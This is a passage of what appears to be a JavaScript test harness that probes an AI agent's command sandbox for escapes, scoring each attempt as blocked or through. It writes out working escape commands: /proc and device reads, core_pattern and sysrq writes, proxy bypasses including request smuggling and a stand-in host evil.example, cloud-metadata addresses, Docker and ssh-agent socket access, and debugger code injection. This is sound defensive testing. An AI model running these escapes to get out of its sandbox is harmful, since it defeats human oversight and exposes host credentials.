		through: async (r, before) => r.stdout.includes('CANARY') || r.stdout.includes('NET') || hit(before, 'tcp4') || (await read(join(ws, '.git/config'))).includes('VOLTPWN') || (await read(join(ws, '.git/hooks/pre-commit'))).includes('VOLTPWN'),
		cleanup: async () => { await fs.rm(join(ws, '.git/hooks/pre-commit'), { force: true }); },
	},
	// ---- /proc and /dev ----
	{
		id: 'proc-tricks', cls: '/proc', platform: 'linux', what: '/proc/1/environ, /proc/*/root and cwd, /proc/sys writes (core_pattern), sysrq, kcore, /sys/fs/cgroup, host pids',
		sh: `cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | grep -c CANARY-ENV; cat /proc/1/root${outside}/secret.txt /proc/self/root${outside}/secret.txt /proc/1/cwd/../outside/secret.txt 2>/dev/null; echo '|touch ${outside}/pwned-core' > /proc/sys/kernel/core_pattern 2>/dev/null && echo WROTE-CORE; echo h > /proc/sysrq-trigger 2>/dev/null && echo WROTE-SYSRQ; head -c 16 /proc/kcore >/dev/null 2>&1 && echo READ-KCORE; mkdir /sys/fs/cgroup/volt-r10 2>/dev/null && echo WROTE-CGROUP; ls /proc | grep -c '^[0-9]' | sed 's/^/PIDS:/'; grep -l 'volt-r10-canary-[p]roc' /proc/[0-9]*/cmdline 2>/dev/null | sed 's/^/HOSTPID:/'; for p in /proc/[0-9]*; do cat $p/environ 2>/dev/null | tr '\\0' '\\n' | grep CANARY-ENV; done; true`,
		through: r => /CANARY-OUTSIDE|WROTE-|READ-KCORE|HOSTPID|CANARY-ENV/.test(r.stdout.replace(/^0$/m, '')),
	},
	{
		id: 'dev-tricks', cls: '/dev', what: 'device files: other terminals, raw disks and memory, a new pty pair to write a host terminal, /dev/fd of inherited descriptors, shared memory',
		prepare: async ctx => {
			// A terminal the probe owns: the sandbox must not write to it (it stands for the user's other terminals).
			if (!isMac) { return undefined; }
			ctx.ttyLog = join(outside, 'tty.log');
			ctx.script = spawn('/usr/bin/script', ['-q', ctx.ttyLog, '/bin/sh', '-c', `tty > ${outside}/tty.name; sleep 25`], { stdio: 'ignore' });
			for (let i = 0; i < 30 && !(await read(join(outside, 'tty.name'))).trim(); i++) { await new Promise(resolve => setTimeout(resolve, 100)); }
			ctx.tty = (await read(join(outside, 'tty.name'))).trim();
			return ctx.tty ? undefined : 'no canary terminal: the other-terminal write is not tried';
		},
		sh: ctx => `${ctx.tty ? `echo VOLTPWN-TTY > ${ctx.tty} 2>/dev/null; head -c 1 ${ctx.tty} </dev/null >/dev/null 2>&1 && echo READ-TTY;` : ''} for d in /dev/disk0 /dev/rdisk0 /dev/sda /dev/mem /dev/kmem /dev/bpf0 /dev/console; do head -c 1 $d >/dev/null 2>&1 && echo READ-$d; done; ls /dev/fd/ | tr '\\n' ' ' | sed 's/^/FDS:/'; echo; echo x > /dev/shm/volt-r10-shm 2>/dev/null; true`,
		through: async (r, _before, ctx) => /READ-/.test(r.stdout) || (ctx.ttyLog ? (await read(ctx.ttyLog)).includes('VOLTPWN-TTY') : false) || (isLinux && existsSync('/dev/shm/volt-r10-shm')),
		detail: r => (/FDS:[^\n]*/.exec(r.stdout)?.[0] ?? ''),
		cleanup: async ctx => { ctx.script?.kill('SIGKILL'); for (const p of [join(outside, 'tty.log'), join(outside, 'tty.name')]) { await fs.rm(p, { force: true }); } },
	},
	// ---- network: DNS, proxy bypass, raw addresses, IPv6, other ports ----
	{
		id: 'net-direct', cls: 'network bypass', what: 'around the proxy with the proxy variables cleared: loopback over IPv4 and IPv6, UDP, a raw public address, DNS (libc, dig, host, dscacheutil)',
		sh: `unset HTTPS_PROXY HTTP_PROXY ALL_PROXY https_proxy http_proxy all_proxy NO_PROXY no_proxy; ${PERL} -MIO::Socket::INET -e 'IO::Socket::INET->new(PeerAddr=>"127.0.0.1:${port4}", Timeout=>2) and print "DIRECT-V4\\n"'; ${PERL} -MSocket -e 'socket(S, PF_INET6, SOCK_STREAM, 0) or exit; connect(S, pack_sockaddr_in6(${port6 || 1}, inet_pton(AF_INET6, "::1"))) and print "DIRECT-V6\\n"' 2>/dev/null; ${PERL} -MSocket -e 'socket(S, PF_INET6, SOCK_STREAM, 0) or exit; connect(S, pack_sockaddr_in6(${port4}, inet_pton(AF_INET6, "::ffff:127.0.0.1"))) and print "DIRECT-V4MAPPED\\n"' 2>/dev/null; ${PERL} -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"127.0.0.1:${udpPort}", Proto=>"udp") and $s->send("x")'; ${PERL} -MIO::Socket::INET -e 'IO::Socket::INET->new(PeerAddr=>"192.0.2.1:443", Timeout=>2) and print "DIRECT-PUBLIC\\n"'; ${PERL} -e 'gethostbyname("volt-r10-$$.example.com") and print "DNS-LIBC\\n"'; (dig +time=2 +tries=1 +short example.com 2>/dev/null | grep -q '^[0-9]' && echo DNS-DIG); (host -W 2 example.com 2>/dev/null | grep -q 'has address' && echo DNS-HOST); ${isMac ? `(dscacheutil -q host -a name example.com 2>/dev/null | grep -q ip_address && echo DNS-DSCACHE);` : ''} sleep 0.3; true`,
		through: (r, before) => /DIRECT-|DNS-/.test(r.stdout) || hit(before, 'tcp4') || hit(before, 'tcp6') || hit(before, 'udp'),
		detail: (r, before) => [...r.stdout.matchAll(/(DIRECT|DNS)-[A-Z0-9]+/g)].map(m => m[0]).concat(hit(before, 'udp') ? ['UDP-LOOPBACK'] : []).join(' '),
	},
	{
		id: 'net-proxy-address-forms', cls: 'network bypass', arms: ['proxy-any'], what: 'through a proxy that allows every host: loopback in decimal, hex, octal, short, IPv6, IPv4-mapped, trailing-dot and unspecified forms, metadata and private ranges',
		sh: proxyConnect([`127.0.0.1:${port4}`, `2130706433:${port4}`, `0x7f000001:${port4}`, `0177.0.0.1:${port4}`, `127.1:${port4}`, `0:${port4}`, `0.0.0.0:${port4}`, `localhost:${port4}`, `localhost.:${port4}`, `LOCALHOST:${port4}`, `[::1]:${port6 || port4}`, `[::]:${port6 || port4}`,
			`[::ffff:127.0.0.1]:${port4}`, `[::ffff:7f00:1]:${port4}`, `[0:0:0:0:0:ffff:7f00:1]:${port4}`, `[64:ff9b::7f00:1]:${port4}`, `[::127.0.0.1]:${port4}`, '169.254.169.254:80', '[fd00:ec2::254]:80', '10.0.0.1:80', '192.168.1.1:80', '100.100.100.200:80', `${os.hostname()}:${port4}`]),
		through: (r, before) => / 200/.test(r.stdout) || hit(before, 'tcp4') || hit(before, 'tcp6'),
		detail: r => r.stdout.split('\n').filter(line => / 200/.test(line)).join(' | ') || `every form refused (${(r.stdout.match(/ 40\d/g) ?? []).length} refusals)`,
	},
	{
		id: 'net-proxy-rules', cls: 'network bypass', arms: ['agent-on'], what: 'the agent route: CONNECT to a host outside the rules, to an allowed host on ports 22/25/80/8080/6379, without the token, with a wrong token; Host header naming an allowed host; a second request on a kept-alive connection; absolute-URI GET to a loopback service',
		sh: [
			proxyConnect(['registry.npmjs.org:443', 'evil.example:443', 'registry.npmjs.org:22', 'registry.npmjs.org:25', 'registry.npmjs.org:8080', 'registry.npmjs.org:6379', 'registry.npmjs.org:80', 'registry.npmjs.org.evil.example:443', 'evil.example@registry.npmjs.org:443', 'registry.npmjs.org%2eevil.example:443', 'REGISTRY.NPMJS.ORG.:443']),
			proxyRaw('NOTOKEN', 'CONNECT registry.npmjs.org:443 HTTP/1.1\\r\\nHost: registry.npmjs.org:443\\r\\n\\r\\n', false),
			proxyRaw('BADTOKEN', 'CONNECT registry.npmjs.org:443 HTTP/1.1\\r\\nHost: registry.npmjs.org:443\\r\\nProxy-Authorization: Basic eDp5\\r\\n\\r\\n', false),
			proxyRaw('HOSTHDR', 'CONNECT evil.example:443 HTTP/1.1\\r\\nHost: registry.npmjs.org:443\\r\\nAUTH\\r\\n\\r\\n'),
			proxyRaw('ABSURI-EVIL', 'GET http://evil.example/x HTTP/1.1\\r\\nHost: registry.npmjs.org\\r\\nAUTH\\r\\nConnection: close\\r\\n\\r\\n'),
			proxyRaw('ABSURI-LOOP', `GET http://127.0.0.1:${port4}/x HTTP/1.1\\r\\nHost: 127.0.0.1:${port4}\\r\\nAUTH\\r\\nConnection: close\\r\\n\\r\\n`),
			proxyRaw('KEEPALIVE', 'GET http://registry.npmjs.org/a HTTP/1.1\\r\\nHost: registry.npmjs.org\\r\\nAUTH\\r\\n\\r\\nGET http://evil.example/b HTTP/1.1\\r\\nHost: evil.example\\r\\nAUTH\\r\\nConnection: close\\r\\n\\r\\n'),
			proxyRaw('SMUGGLE', 'GET http://registry.npmjs.org/a HTTP/1.1\\r\\nHost: registry.npmjs.org\\r\\nAUTH\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET http://evil.example/c HTTP/1.1\\r\\nHost: evil.example\\r\\n\\r\\n'),
		].join('; '),
		through: (r, before) => {
			const status = target => new RegExp(`^CONNECT ${target.replace(/[[\].%@]/g, '\\$&')} HTTP/1\\.[01] (\\d{3})`, 'm').exec(r.stdout)?.[1];
			const bad = ['evil.example:443', 'registry.npmjs.org:22', 'registry.npmjs.org:25', 'registry.npmjs.org:8080', 'registry.npmjs.org:6379', 'registry.npmjs.org.evil.example:443', 'evil.example@registry.npmjs.org:443', 'registry.npmjs.org%2eevil.example:443'].filter(target => status(target) === '200');
			const raw = ['NOTOKEN 200', 'BADTOKEN 200', 'HOSTHDR 200', 'ABSURI-EVIL 200', 'ABSURI-LOOP 200'].filter(line => r.stdout.includes(line));
			return bad.length > 0 || raw.length > 0 || hit(before, 'tcp4') || resolved.includes('evil.example') || resolved.includes('registry.npmjs.org.evil.example');
		},
		detail: r => r.stdout.split('\n').filter(line => /^(CONNECT|NOTOKEN|BADTOKEN|HOSTHDR|ABSURI|KEEPALIVE|SMUGGLE)/.test(line)).map(line => line.replace(/^CONNECT /, '').replace(/HTTP\/1\.[01] /, '')).join(' | ') + ` | resolved: ${[...new Set(resolved)].join(',')}`,
	},
	{
		id: 'net-listen', cls: 'network bypass', what: 'listen on a port nobody granted (a backdoor other processes or devices could connect to)',
		sh: `${PERL} -MIO::Socket::INET -e '$s=IO::Socket::INET->new(Listen=>1, LocalAddr=>"0.0.0.0", LocalPort=>0, ReuseAddr=>1) or exit; print "LISTEN ".$s->sockport."\\n"; $|=1; $SIG{ALRM}=sub{exit}; alarm 3; $c=$s->accept and print "ACCEPTED\\n"' & sleep 1; wait; true`,
		through: async r => {
			// On Linux the sandbox has its own network namespace: a listener there is not on this machine.
			const port = /LISTEN (\d+)/.exec(r.stdout)?.[1];
			return isMac && !!port;
		},
		detail: r => /LISTEN \d+/.exec(r.stdout)?.[0] ?? 'no listener',
	},
	// ---- unix sockets ----
	{
		id: 'unix-sockets', cls: 'unix sockets', what: 'connect to unix sockets: Docker\'s, the ssh agent\'s (SSH_AUTH_SOCK), one in a writable temp folder, one in the workspace, one outside, an abstract one (Linux)',
		sh: `for s in '${sockDocker}' '${sockSsh}' '${sockTmp}' '${sockWs}' '${sockOutside}'; do ${PERL} -MIO::Socket::UNIX -e 'IO::Socket::UNIX->new(Peer=>$ARGV[0]) and print "CONNECTED $ARGV[0]\\n"' "$s"; done; ${isLinux ? `${PERL} -MSocket -e 'socket(S, PF_UNIX, SOCK_STREAM, 0) or exit; connect(S, pack_sockaddr_un("\\0${abstractName}")) and print "CONNECTED abstract\\n"';` : ''} (command -v curl >/dev/null && curl -s -m 3 --unix-socket '${sockDocker}' http://localhost/_ping); sleep 0.2; true`,
		through: (r, before) => r.stdout.includes('CONNECTED') || ['unixTmp', 'unixWs', 'unixDocker', 'unixSsh', 'unixOutside', 'abstract'].some(key => hit(before, key)),
		detail: (r, before) => ['unixTmp', 'unixWs', 'unixDocker', 'unixSsh', 'unixOutside', 'abstract'].filter(key => hit(before, key)).join(', ') || 'none reached',
	},
	// ---- Mach services and other ways to have something outside run code (macOS) ----
	{
		id: 'mach-debugger', cls: 'mach services', platform: 'darwin', what: 'attach a debugger to a process outside the sandbox (task port of a same-user process) and run code in it',
		// With Developer mode off, macOS asks the user for a password when a debugger attaches: never raise that prompt from a test.
		prepare: async () => { try { return /enabled/.test(execFileSync('/usr/sbin/DevToolsSecurity', ['-status'], { encoding: 'utf8' })) ? undefined : 'SKIP: Developer mode is off (attaching would raise a system password prompt)'; } catch { return 'SKIP: DevToolsSecurity unavailable'; } },
		sh: `(/usr/bin/lldb --batch -p ${canaryProc.pid} -o 'expr (int)system("touch ${outside}/pwned-lldb")' -o detach 2>&1 | head -5) & P=$!; (sleep 25; kill -9 $P 2>/dev/null) & wait $P 2>/dev/null; true`,
		timeoutMs: 60_000,
		through: () => exists(join(outside, 'pwned-lldb')),
		cleanup: () => fs.rm(join(outside, 'pwned-lldb'), { force: true }),
	},
	{
		id: 'mach-run-elsewhere', cls: 'mach services', platform: 'darwin', what: 'ask a service outside to run something: Simulator (simctl), Shortcuts, Spotlight (file names and contents of the whole disk), cron, osascript (open, launchctl and LaunchServices are MACOS-OUT-1/2 in the suite)',
		sh: `(/usr/bin/xcrun simctl list devices 2>/dev/null | grep -q -- '-- iOS' && echo REACHED-SIMCTL); (/usr/bin/shortcuts list >/dev/null 2>&1 && echo REACHED-SHORTCUTS); (n=$(/usr/bin/mdfind -count 'kMDItemContentType == "com.apple.application-bundle"' 2>/dev/null); [ "\${n:-0}" -gt 0 ] && echo REACHED-SPOTLIGHT); (/usr/bin/crontab -l >/dev/null 2>&1; [ $? -eq 0 ] && echo REACHED-CRONTAB); (/usr/bin/osascript -e 'do shell script "touch ${outside}/pwned-osa"' >/dev/null 2>&1); sleep 1; true`,
		timeoutMs: 90_000,
		through: async r => /REACHED-(SIMCTL|SHORTCUTS|SPOTLIGHT)/.test(r.stdout) || await exists(join(outside, 'pwned-osa')),
		detail: r => [...r.stdout.matchAll(/REACHED-[A-Z]+/g)].map(m => m[0]).join(' ') || 'none reached',
		cleanup: () => fs.rm(join(outside, 'pwned-osa'), { force: true }),
	},
	{
		id: 'mach-keychain', cls: 'mach services', platform: 'darwin', informational: true, what: 'ask securityd for a keychain item (a name that does not exist: only whether the search ran is read, no item)',
		// Exit 44 is "the item could not be found": the search ran in the user's keychains. Anything else: securityd or the keychain files were out of reach.
		sh: `/usr/bin/security find-generic-password -s volt-r10-canary-item-that-does-not-exist >/dev/null 2>&1; echo "SECURITY-EXIT $?"`,
		through: r => r.stdout.includes('SECURITY-EXIT 44'),
		detail: r => /SECURITY-EXIT \d+/.exec(r.stdout)?.[0] ?? '',
	},
];

// --- Run ----------------------------------------------------------------------------------------
const capabilities = await manager.capabilities();
if (!capabilities.available) {
	console.error(`No sandbox backend: ${capabilities.diagnostics?.join(' ')}`);
	process.exit(2);
}
const rows = [];
try {
	for (const attempt of ATTEMPTS) {
		if (only.length && !only.includes(attempt.id)) { continue; }
		if (attempt.platform && attempt.platform !== process.platform) {
			rows.push({ id: attempt.id, cls: attempt.cls, what: attempt.what, arm: '-', outcome: 'n/a', detail: `${attempt.platform} only` });
			continue;
		}
		for (const armId of attempt.arms ?? DEFAULT_ARMS) {
			const ctx = {};
			let outcome = 'BLOCKED', detail = '';
			try {
				const note = await attempt.prepare?.(ctx);
				if (typeof note === 'string' && note.startsWith('SKIP: ')) {
					rows.push({ id: attempt.id, cls: attempt.cls, what: attempt.what, arm: armId, outcome: 'n/a', detail: note.slice(6) });
					console.log(`${'n/a'.padEnd(8)} ${attempt.id.padEnd(26)} ${armId.padEnd(10)} ${note.slice(6)}`);
					continue;
				}
				const before = snapshotHits();
				const script = typeof attempt.sh === 'function' ? attempt.sh(ctx) : attempt.sh;
				const result = await run(armId, script, { env: attempt.env?.(), timeoutMs: attempt.timeoutMs });
				if (!result.stdout.startsWith('volt-ran')) {
					outcome = 'NOT-RUN';
					detail = `${result.status} ${result.error ?? ''} ${result.stderr.slice(0, 200)}`;
				} else {
					const through = await attempt.through(result, before, ctx);
					const gap = through ? attempt.gap?.() : undefined;
					outcome = through ? (gap ? 'GAP' : 'THROUGH') : 'BLOCKED';
					detail = [note, gap, await attempt.detail?.(result, before, ctx), through && !attempt.detail ? result.stdout.replace(/^volt-ran\n/, '').slice(0, 300).replace(/\n/g, ' | ') : '', result.unenforced?.length ? `unenforced: ${result.unenforced.join(',')}` : ''].filter(Boolean).join('; ');
				}
			} catch (error) {
				outcome = 'ERROR';
				detail = String(error?.stack ?? error).slice(0, 400);
			} finally {
				try { await attempt.cleanup?.(ctx); } catch { /* fixture cleanup is best effort */ }
			}
			const row = { id: attempt.id, cls: attempt.cls, what: attempt.what, arm: armId, outcome, detail, ...(attempt.informational ? { informational: true } : {}) };
			rows.push(row);
			console.log(`${outcome.padEnd(8)} ${attempt.id.padEnd(26)} ${armId.padEnd(10)} ${detail}`);
		}
	}
} finally {
	await manager.dispose();
	await stubManager.dispose();
	for (const server of servers) { server.close(); }
	udpServer.close();
	canaryProc.kill('SIGKILL');
	await fs.rm(root, { recursive: true, force: true });
}
const summary = { platform: process.platform, release: os.release(), backend: capabilities.backend, when: new Date().toISOString(), load: os.loadavg()[0], through: rows.filter(row => row.outcome === 'THROUGH').length, gap: rows.filter(row => row.outcome === 'GAP').length, blocked: rows.filter(row => row.outcome === 'BLOCKED').length, other: rows.filter(row => !['THROUGH', 'GAP', 'BLOCKED', 'n/a'].includes(row.outcome)).length };
console.log(JSON.stringify(summary));
if (outFile) {
	await fs.writeFile(outFile, JSON.stringify({ summary, rows }, null, '\t') + '\n');
}
process.exit(rows.some(row => row.outcome === 'THROUGH' && !row.informational) ? 1 : 0);
